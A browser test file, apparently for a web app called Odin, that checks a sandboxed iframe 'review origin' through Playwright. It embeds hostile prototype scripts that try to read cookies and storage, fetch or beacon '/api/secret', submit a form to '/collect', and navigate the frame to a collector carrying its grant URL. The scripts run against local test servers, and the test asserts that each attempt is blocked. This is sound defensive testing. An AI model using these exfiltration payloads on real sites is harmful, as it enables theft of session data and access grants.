import assert from 'node:assert/strict';
import { writeFile } from 'node:fs/promises';
import http from 'node:http';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';

import { createInMemoryObjectStorage } from '../src/modules/requirements/packages/package-storage.js';
import { createInMemoryPackagesRepository } from '../src/modules/requirements/packages/packages.repository.js';
import { issuePackageGrant, ingestPackage } from '../src/modules/requirements/packages/packages.service.js';
import { createReviewOriginApp } from '../src/review-origin/app.js';
import { buildZip, manifestWith, prototypeScreen, REPO_ROOT } from './helpers/review-packages.js';

// Real-browser check of the review origin. The app page and the
// review origin run on the same host and different ports, so they share cookies by host:
// the frame could read the app's cookie if the sandbox did not give it an opaque origin.
// Skips when Playwright or its Chromium build is not installed.

function loadPlaywright() {
  try {
    return createRequire(path.join(REPO_ROOT, 'frontend/package.json'))('playwright');
  } catch (_error) {
    return null;
  }
}

const HOSTILE_HTML = `<!doctype html>
<html><head><meta charset="utf-8"><title>Hostile</title></head>
<body>
<h1 data-odin-id="headline">Totally normal prototype</h1>
<form id="steal" method="post"><input name="secret" value="from-frame"></form>
<script src="app.js"></script>
</body></html>
`;

// Runs inside the sandboxed frame. Everything it tries must fail. It also records whether
// inline styles, style attributes, and inline event handlers took effect, and whether eval runs.
const HOSTILE_JS = `(async function () {
  var results = { variant: document.documentElement.getAttribute('data-variant') || 'external' };
  var parentOrigin = new URLSearchParams(location.search).get('odin-parent') || (location.ancestorOrigins && location.ancestorOrigins[0]) || '';
  function blocked(error) { return 'blocked:' + (error && error.name); }
  var headline = document.querySelector('h1');
  results.headlineColor = getComputedStyle(headline).color;
  results.headlineBorder = getComputedStyle(headline).borderTopStyle;
  var clicker = document.getElementById('clicker');
  if (clicker) clicker.click();
  results.inlineHandler = window.__inlineHandlerRan ? 'ran' : 'not-run';
  try { results.evalCall = 'ran:' + eval('1 + 1'); } catch (e) { results.evalCall = blocked(e); }
  try { results.cookie = 'read:' + document.cookie; } catch (e) { results.cookie = blocked(e); }
  try { results.parentDocument = 'read:' + window.parent.document.cookie; } catch (e) { results.parentDocument = blocked(e); }
  try { results.topDocument = 'read:' + window.top.document.title; } catch (e) { results.topDocument = blocked(e); }
  try { results.localStorage = 'read:' + window.localStorage.length; } catch (e) { results.localStorage = blocked(e); }
  try { var r = await fetch(parentOrigin + '/api/secret'); results.fetchApp = 'status:' + r.status + ':' + (await r.text()); } catch (e) { results.fetchApp = blocked(e); }
  try { var n = await fetch(parentOrigin + '/api/secret', { mode: 'no-cors' }); results.fetchNoCors = 'type:' + n.type; } catch (e) { results.fetchNoCors = blocked(e); }
  try { var x = await fetch('http://example.com/'); results.fetchOther = 'status:' + x.status; } catch (e) { results.fetchOther = blocked(e); }
  try { var s = await fetch('/api/projects'); results.fetchReviewOriginApi = 'status:' + s.status; } catch (e) { results.fetchReviewOriginApi = blocked(e); }
  try { results.beacon = 'queued:' + navigator.sendBeacon(parentOrigin + '/api/secret?beacon', 'x'); } catch (e) { results.beacon = blocked(e); }
  await new Promise(function (resolve) { var img = new Image(); img.onload = function () { results.image = 'loaded'; resolve(); }; img.onerror = function () { results.image = 'failed'; resolve(); }; img.src = parentOrigin + '/api/secret?image'; });
  try { results.popup = 'opened:' + Boolean(window.open(parentOrigin + '/popup')); } catch (e) { results.popup = blocked(e); }
  window.postMessage({ type: 'goto-state', key: 'hijacked' }, '*');
  await new Promise(function (resolve) { setTimeout(resolve, 150); });
  results.selfCommand = location.hash === '#hijacked' ? 'obeyed' : 'ignored';
  try { window.top.location.href = parentOrigin + '/navigated'; results.topNavigation = 'no-error'; } catch (e) { results.topNavigation = blocked(e); }
  window.parent.postMessage({ results: results, source: 'hostile-report' }, '*');
  var form = document.getElementById('steal');
  form.action = parentOrigin + '/collect';
  try { form.submit(); results.formSubmit = 'submitted'; } catch (e) { results.formSubmit = blocked(e); }
  setTimeout(function () { window.parent.postMessage({ phase: 'after-submit', source: 'hostile-report', stillHere: location.pathname }, '*'); }, 800);
})();
`;

// Navigates its own frame to a collector, carrying its URL (and so its grant). The iframe
// sandbox allows a frame to navigate itself; only the app page's frame-src stops it.
const NAVIGATING_HTML = `<!doctype html>
<html><head><meta charset="utf-8"><title>Navigating</title></head>
<body><p>Loading</p><script src="app.js"></script></body></html>
`;
const NAVIGATING_JS = `var collector = new URLSearchParams(location.search).get('collector');
location.href = collector + '/collect?data=' + encodeURIComponent(location.href);
`;

// The same attack as inline code, with an inline <style>, a style attribute, and an inline
// event handler, all of which the review-origin CSP allows.
const HOSTILE_INLINE_HTML = `<!doctype html>
<html data-variant="inline"><head><meta charset="utf-8"><title>Hostile inline</title>
<style>h1 { color: rgb(200, 0, 0); }</style>
</head>
<body>
<h1 data-odin-id="headline" style="border-top: 3px solid rgb(0, 0, 200)">Totally normal prototype</h1>
<button id="clicker" onclick="window.__inlineHandlerRan = true">Click</button>
<form id="steal" method="post"><input name="secret" value="from-frame"></form>
<script>${HOSTILE_JS}</script>
</body></html>
`;

function listen(server) {
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${server.address().port}`)));
}

// `policy.frameSrc`, once set, is sent as the app page's CSP, as the app's Apache vhost
// does. `?csp=off` leaves it out, to show what it stops.
function createParentServer(hits, policy = {}) {
  return http.createServer((req, res) => {
    const url = new URL(req.url, 'http://parent.test');
    if (url.pathname !== '/') {
      hits.push(`${req.method} ${url.pathname}${url.search}`);
      res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' });
      res.end('{"secret":"app-data"}');
      return;
    }
    const src = url.searchParams.get('src') ?? '';
    res.writeHead(200, {
      ...(policy.frameSrc && url.searchParams.get('csp') !== 'off' ? { 'Content-Security-Policy': `frame-src ${policy.frameSrc}` } : {}),
      'Content-Type': 'text/html; charset=utf-8',
      'Set-Cookie': 'odin_session=parent-secret; Path=/; SameSite=Lax',
    });
    res.end(`<!doctype html><html><head><title>Odin app</title></head><body>
<iframe id="frame" sandbox="allow-scripts allow-forms" width="1280" height="800" style="border:0;display:block" src="${src.replace(/"/g, '&quot;')}"></iframe>
<script>
  window.messages = [];
  window.addEventListener('message', function (event) {
    var frame = document.getElementById('frame');
    window.messages.push({ data: event.data, fromFrame: event.source === frame.contentWindow, origin: event.origin });
  });
  window.send = function (message) { document.getElementById('frame').contentWindow.postMessage(message, '*'); };
  window.decodePng = function (dataUrl, points) {
    return new Promise(function (resolve, reject) {
      var image = new Image();
      image.onload = function () {
        var canvas = document.createElement('canvas');
        canvas.width = image.naturalWidth;
        canvas.height = image.naturalHeight;
        var context = canvas.getContext('2d');
        context.drawImage(image, 0, 0);
        var data = context.getImageData(0, 0, canvas.width, canvas.height).data;
        var colors = new Set();
        for (var i = 0; i < data.length; i += 4 * 97) colors.add(data[i] + ',' + data[i + 1] + ',' + data[i + 2]);
        var samples = points.map(function (point) {
          var offset = (point[1] * canvas.width + point[0]) * 4;
          return [data[offset], data[offset + 1], data[offset + 2]];
        });
        resolve({ distinctColors: colors.size, height: canvas.height, samples: samples, width: canvas.width });
      };
      image.onerror = function () { reject(new Error('PNG did not decode')); };
      image.src = dataUrl;
    });
  };
</script></body></html>`);
  });
}

test('review origin in Chromium: bridge messages, states, capture, hints, and hostile prototypes that get nothing', { timeout: 180_000 }, async (t) => {
  const playwright = loadPlaywright();
  if (!playwright) {
    t.skip('Playwright is not installed in frontend/node_modules.');
    return;
  }
  let browser;
  try {
    browser = await playwright.chromium.launch();
  } catch (error) {
    t.skip(`Chromium is not available: ${String(error.message).split('\n')[0]}`);
    return;
  }

  const hits = [];
  const evilHits = [];
  const collected = [];
  const appPolicy = {};
  const parentServer = createParentServer(hits, appPolicy);
  const evilServer = createParentServer(evilHits);
  const collectorServer = createParentServer(collected);
  const parentOrigin = await listen(parentServer);
  const evilOrigin = await listen(evilServer);
  const collectorOrigin = await listen(collectorServer);

  const packagesRepository = createInMemoryPackagesRepository();
  const storage = createInMemoryObjectStorage();
  const deps = { mermaidValidator: null, packageStorage: storage, packagesRepository, requirementsRepository: null };
  const exampleDir = path.join(REPO_ROOT, 'tools/review-package/examples/fieldwork-round-2/prototypes/booking');
  const { readFile } = await import('node:fs/promises');
  const files = {
    'manifest.json': JSON.stringify(manifestWith({ sections: [{ id: 'screens', items: [
      prototypeScreen('booking', { states: [{ key: 'choose-service', label: 'Choose service' }, { key: 'pick-time', label: 'Pick a time' }, { key: 'confirm', label: 'Confirm' }] }),
      prototypeScreen('hostile'),
      prototypeScreen('hostile-inline'),
      prototypeScreen('navigating'),
    ], type: 'screens' }] })),
    'prototypes/booking/app.js': await readFile(path.join(exampleDir, 'app.js')),
    'prototypes/booking/index.html': await readFile(path.join(exampleDir, 'index.html')),
    'prototypes/booking/styles.css': await readFile(path.join(exampleDir, 'styles.css')),
    'prototypes/hostile/app.js': HOSTILE_JS,
    'prototypes/hostile/index.html': HOSTILE_HTML,
    'prototypes/hostile-inline/index.html': HOSTILE_INLINE_HTML,
    'prototypes/navigating/app.js': NAVIGATING_JS,
    'prototypes/navigating/index.html': NAVIGATING_HTML,
  };
  const outcome = await ingestPackage(deps, { bytes: await buildZip(files), projectId: 'p', source: 'ui', tenantId: 't', track: 'experience', uploadedBy: 'user:u' });
  assert.equal(outcome.status, 'accepted', JSON.stringify(outcome.errors));

  const reviewApp = createReviewOriginApp({ frontendAppUrl: `${parentOrigin}/app`, grantSecret: 'browser-test-secret-0123456789abcdefgh', mayViewGrant: async () => true, packagesRepository, storage });
  const reviewServer = http.createServer(reviewApp);
  const reviewOrigin = await listen(reviewServer);
  appPolicy.frameSrc = reviewOrigin;
  const grant = await issuePackageGrant(
    { packagesRepository, reviewGrantSecret: 'browser-test-secret-0123456789abcdefgh', reviewPublicUrl: reviewOrigin },
    { packageId: outcome.package.id, viewerRef: 'user:u' },
  );
  const entry = (screenId, parent = parentOrigin) => `${grant.entryUrls[screenId]}?odin-parent=${encodeURIComponent(parent)}`;

  try {
    const context = await browser.newContext({ viewport: { height: 900, width: 1400 } });
    const page = await context.newPage();
    const consoleErrors = [];
    page.on('console', (message) => { if (message.type() === 'error') consoleErrors.push(message.text()); });
    await page.goto(`${parentOrigin}/?src=${encodeURIComponent(entry('booking'))}`);
    const waitFor = (predicate, timeout = 15_000) => page.waitForFunction(predicate, null, { timeout });

    // ready: from the frame, opaque origin, with the declared initial state.
    await waitFor(() => window.messages.some((m) => m.data && m.data.source === 'odin-review-bridge' && m.data.type === 'ready'));
    const ready = await page.evaluate(() => window.messages.find((m) => m.data.type === 'ready'));
    assert.equal(ready.fromFrame, true);
    assert.equal(ready.origin, 'null');
    assert.equal(ready.data.version, 1);
    assert.deepEqual(ready.data.state, { declared: true, hash: '', key: 'choose-service', path: 'prototypes/booking/index.html' });
    assert.deepEqual(ready.data.viewport, { devicePixelRatio: 1, height: 800, width: 1280 });
    assert.deepEqual(ready.data.scroll.x, 0);

    // goto-state: the prototype handles the hash and names its state.
    await page.evaluate(() => window.send({ key: 'pick-time', type: 'goto-state' }));
    await waitFor(() => window.messages.some((m) => m.data.type === 'state' && m.data.key === 'pick-time'));
    const state = await page.evaluate(() => window.messages.filter((m) => m.data.type === 'state').at(-1).data);
    assert.deepEqual({ ...state, source: undefined, version: undefined }, { declared: true, hash: '#pick-time', key: 'pick-time', path: 'prototypes/booking/index.html', source: undefined, type: 'state', version: undefined });

    // hint: the nearest data-odin-id, tag, text, and box at a point in frame coordinates.
    const frameBox = await page.locator('#frame').boundingBox();
    const continueBox = await page.frameLocator('#frame').locator('[data-odin-id="continue"]').boundingBox();
    const hintPoint = { x: Math.round(continueBox.x - frameBox.x + 10), y: Math.round(continueBox.y - frameBox.y + 10) };
    await page.evaluate((point) => window.send({ requestId: 'h1', type: 'hint', x: point.x, y: point.y }), hintPoint);
    await waitFor(() => window.messages.some((m) => m.data.type === 'hint' && m.data.requestId === 'h1'));
    const hint = await page.evaluate(() => window.messages.find((m) => m.data.requestId === 'h1').data);
    assert.equal(hint.hint.odinId, 'continue');
    assert.equal(hint.hint.tag, 'a');
    assert.equal(hint.hint.text, 'Continue to confirm →');
    assert.ok(Math.abs(hint.hint.box.x - Math.round(continueBox.x - frameBox.x)) <= 1, JSON.stringify(hint.hint.box));
    assert.ok(hint.hint.box.width > 50 && hint.hint.box.height > 20);

    // capture: a real PNG of the visible frame.
    await page.evaluate(() => window.send({ requestId: 'c1', type: 'capture' }));
    await waitFor(() => window.messages.some((m) => m.data.requestId === 'c1' && /^capture/.test(m.data.type)), 30_000);
    const capture = await page.evaluate(() => window.messages.find((m) => m.data.requestId === 'c1').data);
    assert.equal(capture.type, 'capture', capture.reason);
    assert.equal(capture.stateKey, 'pick-time');
    assert.match(capture.dataUrl, /^data:image\/png;base64,/);
    const continueCenter = [Math.round(continueBox.x - frameBox.x + continueBox.width / 2), Math.round(continueBox.y - frameBox.y + 4)];
    const decoded = await page.evaluate(([dataUrl, points]) => window.decodePng(dataUrl, points), [capture.dataUrl, [[640, 760], continueCenter]]);
    assert.equal(decoded.width, 1280);
    assert.equal(decoded.height, 800);
    assert.ok(decoded.distinctColors > 20, `non-blank: ${decoded.distinctColors} colors`);
    assert.deepEqual(decoded.samples[0], [250, 247, 240], 'page background #faf7f0 fills the viewport');
    assert.deepEqual(decoded.samples[1], [31, 77, 58], 'the Continue button is #1f4d3a');
    const evidence = path.join(tmpdir(), `odin-review-capture-${process.pid}.png`);
    await writeFile(evidence, Buffer.from(capture.dataUrl.split(',')[1], 'base64'));
    t.diagnostic(`capture written to ${evidence}`);

    // The bridge only talks to the configured app origin: another origin cannot even frame it.
    const evilPage = await context.newPage();
    await evilPage.goto(`${evilOrigin}/?src=${encodeURIComponent(entry('booking', evilOrigin))}`);
    await evilPage.waitForTimeout(2000);
    assert.deepEqual(await evilPage.evaluate(() => window.messages.filter((m) => m.data && m.data.source === 'odin-review-bridge')), []);
    await evilPage.close();

    // Hostile prototypes: the attack as an external script, then as inline code.
    for (const screenId of ['hostile', 'hostile-inline']) {
      const hostile = await context.newPage();
      await hostile.goto(`${parentOrigin}/?src=${encodeURIComponent(entry(screenId))}`);
      await hostile.waitForFunction(() => window.messages.some((m) => m.data && m.data.source === 'hostile-report' && m.data.results), null, { timeout: 20_000 });
      await hostile.waitForFunction(() => window.messages.some((m) => m.data && m.data.phase === 'after-submit'), null, { timeout: 5_000 }).catch(() => {});
      await hostile.waitForTimeout(500);
      const { results } = await hostile.evaluate(() => window.messages.find((m) => m.data.results).data);
      t.diagnostic(`${screenId} results: ${JSON.stringify(results)}`);
      if (screenId === 'hostile-inline') {
        assert.equal(results.variant, 'inline', 'the inline script ran');
        assert.equal(results.headlineColor, 'rgb(200, 0, 0)', 'inline <style> applies');
        assert.equal(results.headlineBorder, 'solid', 'style attributes apply');
        assert.equal(results.inlineHandler, 'ran', 'inline event handlers run');
      } else {
        assert.equal(results.variant, 'external');
      }
      assert.equal(results.evalCall, 'blocked:EvalError', 'eval stays blocked');
      assert.match(results.cookie, /^blocked:SecurityError$/, 'document.cookie is unavailable');
      assert.match(results.parentDocument, /^blocked:SecurityError$/, 'parent.document is unavailable');
      assert.match(results.topDocument, /^blocked:SecurityError$/);
      assert.match(results.localStorage, /^blocked:SecurityError$/);
      assert.match(results.fetchApp, /^blocked:TypeError$/, 'fetch to the app origin fails');
      assert.match(results.fetchNoCors, /^blocked:TypeError$/, 'even an opaque no-cors fetch is blocked by connect-src');
      assert.match(results.fetchOther, /^blocked:TypeError$/);
      // connect-src 'self' lets this request reach the review origin, which answers 404 with no
      // CORS header, so the opaque-origin frame cannot even read the status.
      assert.equal(results.fetchReviewOriginApi, 'blocked:TypeError', 'the review origin has no API');
      assert.equal(results.image, 'failed');
      assert.equal(results.popup, 'opened:false');
      assert.equal(results.selfCommand, 'ignored', 'commands from anything but the parent are ignored');
      assert.equal(hostile.url().startsWith(parentOrigin), true);
      assert.equal(new URL(hostile.url()).pathname, '/', 'the top window did not navigate');
      assert.deepEqual(hits.filter((hit) => !hit.startsWith('GET /favicon')), [], 'nothing from the frame reached the app origin');
      await hostile.close();
    }
    assert.equal(consoleErrors.some((text) => /Uncaught/.test(text) && /bridge/.test(text)), false, consoleErrors.join('\n'));

    // A prototype that navigates its own frame to a collector. Under the app page's
    // frame-src the navigation is blocked and the collector hears nothing.
    const navigating = `${entry('navigating')}&collector=${encodeURIComponent(collectorOrigin)}`;
    const framed = await context.newPage();
    await framed.goto(`${parentOrigin}/?src=${encodeURIComponent(navigating)}`);
    await framed.waitForTimeout(2000);
    assert.deepEqual(collected, [], 'the frame could not navigate off the review origin');
    await framed.close();

    // Opened directly, the document is refused before any of its script runs.
    const direct = await context.newPage();
    const directResponse = await direct.goto(navigating);
    assert.equal(directResponse.status(), 403);
    await direct.waitForTimeout(1000);
    assert.deepEqual(collected, [], 'a direct visit runs nothing');
    assert.equal(new URL(direct.url()).origin, reviewOrigin);
    await direct.close();

    // The same frame on an app page without frame-src does reach the collector: the page
    // policy is what stops it, and this test would see the leak.
    const unprotected = await context.newPage();
    await unprotected.goto(`${parentOrigin}/?csp=off&src=${encodeURIComponent(navigating)}`);
    await unprotected.waitForTimeout(2000);
    assert.equal(collected.filter((hit) => hit.startsWith('GET /collect?data=')).length, 1, JSON.stringify(collected));
    await unprotected.close();

    await context.close();
  } finally {
    await browser.close();
    await new Promise((resolve) => reviewServer.close(resolve));
    await new Promise((resolve) => parentServer.close(resolve));
    await new Promise((resolve) => evilServer.close(resolve));
    await new Promise((resolve) => collectorServer.close(resolve));
  }
});
